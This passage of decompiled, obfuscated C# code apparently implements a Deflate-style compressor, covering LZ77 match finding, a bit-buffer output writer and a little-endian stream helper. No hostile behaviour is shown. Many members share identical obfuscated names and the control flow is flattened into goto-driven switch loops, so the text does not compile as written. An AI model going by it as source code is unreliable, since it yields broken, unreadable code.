              this.\u003F5\u003F = _param1;
              num2 = 11;
              continue;
            }
            goto label_21;
          case 11:
            index2 = index1;
            num2 = 12;
            continue;
          case 12:
            val1 = index1 - this.\u003F12\u003F;
            num2 = 13;
            continue;
          case 13:
            if (val1 < num3)
            {
              num6 = this.\u003F0\u003F[index2 - 1];
              num2 = 14;
              continue;
            }
            goto label_23;
          case 14:
            num7 = this.\u003F0\u003F[index2];
            goto label_21;
          default:
            goto label_24;
        }
label_13:
        if ((int) this.\u003F0\u003F[_param1 + val1] == (int) num7 && (int) this.\u003F0\u003F[_param1 + val1 - 1] == (int) num6 && (int) this.\u003F0\u003F[_param1] == (int) this.\u003F0\u003F[index1] && (int) this.\u003F0\u003F[_param1 + 1] == (int) this.\u003F0\u003F[index1 + 1])
        {
          num8 = _param1 + 2;
          num2 = 10;
          continue;
        }
        goto label_22;
label_21:
        index1 = this.\u003F12\u003F;
label_22:
        if ((_param1 = (int) numArray1[_param1 & (int) short.MaxValue] & (int) ushort.MaxValue) > num4 && --num1 != 0)
          goto label_13;
label_23:
        this.\u003F9\u003F = Math.Min(val1, this.\u003F13\u003F);
        num2 = 15;
      }
label_24:
      return this.\u003F9\u003F >= 3;
    }

    private bool \u003F0\u003F(bool _param1, bool _param2)
    {
      if (this.\u003F13\u003F < 262 && !_param1)
        return false;
label_31:
      while (this.\u003F13\u003F >= 262 || _param1)
      {
        if (this.\u003F13\u003F != 0)
          goto label_7;
        else
          goto label_33;
label_3:
        int num1;
        bool flag;
        int num2;
        while (true)
        {
          int num3;
          int num4;
          int num5;
          switch (num2)
          {
            case 0:
              this.\u003F0\u003F.\u003F5\u003F(this.\u003F0\u003F, this.\u003F11\u003F, this.\u003F12\u003F - this.\u003F11\u003F, _param2);
              num2 = 1;
              continue;
            case 1:
              this.\u003F11\u003F = this.\u003F12\u003F;
              num2 = 2;
              continue;
            case 2:
              goto label_6;
            case 3:
              num3 = this.\u003F9\u003F;
              num2 = 4;
              continue;
            case 4:
              if (this.\u003F13\u003F >= 3)
              {
                num4 = this.\u003F0\u003F();
                num2 = 5;
                continue;
              }
              break;
            case 5:
              if (num4 != 0 && this.\u003F12\u003F - num4 <= 32506 && this.\u003F0\u003F(num4) && this.\u003F9\u003F <= 5 && this.\u003F9\u003F == 3 && this.\u003F12\u003F - this.\u003F5\u003F > 4096)
              {
                this.\u003F9\u003F = 2;
                break;
              }
              break;
            case 6:
              num3 -= 2;
              goto label_14;
            case 7:
              --this.\u003F13\u003F;
              num2 = 8;
              continue;
            case 8:
              if (this.\u003F13\u003F >= 3)
                goto label_39;
label_17:
              if (--num3 <= 0)
              {
                this.\u003F12\u003F++;
                num2 = 9;
                continue;
              }
              goto label_14;
label_39:
              this.\u003F0\u003F();
              goto label_17;
            case 9:
              --this.\u003F13\u003F;
              num2 = 10;
              continue;
            case 10:
              this.\u003F0\u003F = false;
              num2 = 11;
              continue;
            case 11:
              this.\u003F9\u003F = 2;
              num2 = 12;
              continue;
            case 12:
              if (this.\u003F0\u003F.\u003F0\u003F())
              {
                num5 = this.\u003F12\u003F - this.\u003F11\u003F;
                num2 = 15;
                continue;
              }
              goto label_31;
            case 13:
              ++this.\u003F12\u003F;
              num2 = 14;
              continue;
            case 14:
              --this.\u003F13\u003F;
              goto case 12;
            case 15:
              if (this.\u003F0\u003F)
                goto label_43;
label_27:
              flag = _param2 && this.\u003F13\u003F == 0 && !this.\u003F0\u003F;
              num2 = 16;
              continue;
label_43:
              --num5;
              goto label_27;
            case 16:
              this.\u003F0\u003F.\u003F5\u003F(this.\u003F0\u003F, this.\u003F11\u003F, num5, flag);
              num2 = 17;
              continue;
            case 17:
              this.\u003F11\u003F += num5;
              num2 = 18;
              continue;
            default:
              goto label_30;
          }
          if (num3 < 3 || this.\u003F9\u003F > num3)
          {
            if (this.\u003F0\u003F)
              goto label_41;
label_22:
            this.\u003F0\u003F = true;
            num2 = 13;
            continue;
label_41:
            this.\u003F0\u003F.\u003F0\u003F((int) this.\u003F0\u003F[this.\u003F12\u003F - 1] & (int) byte.MaxValue);
            goto label_22;
          }
          else
          {
            this.\u003F0\u003F.\u003F0\u003F(this.\u003F12\u003F - 1 - num1, num3);
            num2 = 6;
            continue;
          }
label_14:
          ++this.\u003F12\u003F;
          num2 = 7;
        }
label_6:
        return false;
label_30:
        return !flag;
label_7:
        if (this.\u003F12\u003F >= 65274)
          goto label_35;
label_8:
        num1 = this.\u003F5\u003F;
        num2 = 3;
        goto label_3;
label_35:
        this.\u003F5\u003F();
        goto label_8;
label_33:
        if (this.\u003F0\u003F)
          goto label_34;
label_2:
        this.\u003F0\u003F = false;
        num2 = 0;
        goto label_3;
label_34:
        this.\u003F0\u003F.\u003F0\u003F((int) this.\u003F0\u003F[this.\u003F12\u003F - 1] & (int) byte.MaxValue);
        goto label_2;
      }
      return true;
    }

    public bool \u003F5\u003F(bool _param1, bool _param2)
    {
      bool flag1;
      do
      {
        this.\u003F9\u003F();
        int num = 0;
        bool flag2;
        while (true)
        {
          switch (num)
          {
            case 0:
              flag2 = _param1 && this.\u003F15\u003F == this.\u003F17\u003F;
              num = 1;
              continue;
            case 1:
              flag1 = this.\u003F0\u003F(flag2, _param2);
              num = 2;
              continue;
            default:
              goto label_4;
          }
        }
label_4:;
      }
      while (this.\u003F0\u003F.\u003F0\u003F() && flag1);
      return flag1;
    }

    public void \u003F0\u003F(byte[] _param1)
    {
      this.\u003F5\u003F = _param1;
      this.\u003F15\u003F = 0;
      this.\u003F17\u003F = _param1.Length;
    }

    public bool \u003F0\u003F() => this.\u003F17\u003F == this.\u003F15\u003F;
  }

  internal class \u003F17\u003F
  {
    protected byte[] \u003F0\u003F = new byte[65536];
    private int \u003F0\u003F;
    private int \u003F5\u003F;
    private uint \u003F0\u003F;
    private int \u003F9\u003F;

    public void \u003F0\u003F(int _param1)
    {
      this.\u003F0\u003F[this.\u003F5\u003F++] = (byte) _param1;
      this.\u003F0\u003F[this.\u003F5\u003F++] = (byte) (_param1 >> 8);
    }

    public void \u003F0\u003F(byte[] _param1, int _param2, int _param3)
    {
      Array.Copy((Array) _param1, _param2, (Array) this.\u003F0\u003F, this.\u003F5\u003F, _param3);
      this.\u003F5\u003F += _param3;
    }

    public int \u003F0\u003F() => this.\u003F9\u003F;

    public void \u003F0\u003F()
    {
      if (this.\u003F9\u003F <= 0)
        goto label_3;
      else
        goto label_5;
label_1:
      int num;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_2;
          case 1:
            this.\u003F9\u003F = 0;
            num = 2;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return;
label_2:
      if (this.\u003F9\u003F > 8)
        this.\u003F0\u003F[this.\u003F5\u003F++] = (byte) (this.\u003F0\u003F >> 8);
label_3:
      this.\u003F0\u003F = 0U;
      num = 1;
      goto label_1;
label_5:
      this.\u003F0\u003F[this.\u003F5\u003F++] = (byte) this.\u003F0\u003F;
      num = 0;
      goto label_1;
    }

    public void \u003F0\u003F(int _param1, int _param2)
    {
      this.\u003F0\u003F |= (uint) (_param1 << this.\u003F9\u003F);
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\u003F9\u003F += _param2;
            num = 1;
            continue;
          case 1:
            if (this.\u003F9\u003F >= 16)
            {
              this.\u003F0\u003F[this.\u003F5\u003F++] = (byte) this.\u003F0\u003F;
              num = 2;
              continue;
            }
            goto label_8;
          case 2:
            this.\u003F0\u003F[this.\u003F5\u003F++] = (byte) (this.\u003F0\u003F >> 8);
            num = 3;
            continue;
          case 3:
            this.\u003F0\u003F >>= 16;
            num = 4;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      this.\u003F9\u003F -= 16;
      return;
label_8:;
    }

    public bool \u003F0\u003F() => this.\u003F5\u003F == 0;

    public int \u003F0\u003F(byte[] _param1, int _param2, int _param3)
    {
      if (this.\u003F9\u003F < 8)
        goto label_4;
      else
        goto label_11;
label_1:
      int num;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\u003F0\u003F >>= 8;
            num = 1;
            continue;
          case 1:
            goto label_3;
          case 2:
            Array.Copy((Array) this.\u003F0\u003F, this.\u003F0\u003F, (Array) _param1, _param2, _param3);
            num = 3;
            continue;
          case 3:
            this.\u003F0\u003F = 0;
            num = 4;
            continue;
          case 4:
            this.\u003F5\u003F = 0;
            num = 5;
            continue;
          case 5:
            goto label_10;
          default:
            goto label_9;
        }
      }
label_3:
      this.\u003F9\u003F -= 8;
      goto label_4;
label_9:
      this.\u003F0\u003F += _param3;
label_10:
      return _param3;
label_4:
      if (_param3 <= this.\u003F5\u003F - this.\u003F0\u003F)
      {
        Array.Copy((Array) this.\u003F0\u003F, this.\u003F0\u003F, (Array) _param1, _param2, _param3);
        num = 6;
        goto label_1;
      }
      else
      {
        _param3 = this.\u003F5\u003F - this.\u003F0\u003F;
        num = 2;
        goto label_1;
      }
label_11:
      this.\u003F0\u003F[this.\u003F5\u003F++] = (byte) this.\u003F0\u003F;
      num = 0;
      goto label_1;
    }
  }

  internal class \u003F18\u003F : MemoryStream
  {
    public void \u003F0\u003F(int _param1)
    {
      this.WriteByte((byte) (_param1 & (int) byte.MaxValue));
      this.WriteByte((byte) (_param1 >> 8 & (int) byte.MaxValue));
    }

    public void \u003F5\u003F(int _param1)
    {
      this.\u003F0\u003F(_param1);
      this.\u003F0\u003F(_param1 >> 16);
    }

    public int \u003F0\u003F() => this.ReadByte() | this.ReadByte() << 8;

    public int \u003F5\u003F() => this.\u003F0\u003F() | this.\u003F0\u003F() << 16;

    public \u003F18\u003F()
    {
    }

    public \u003F18\u003F(byte[] _param1)
      : base(_param1, false)
    {
    }
  }
}
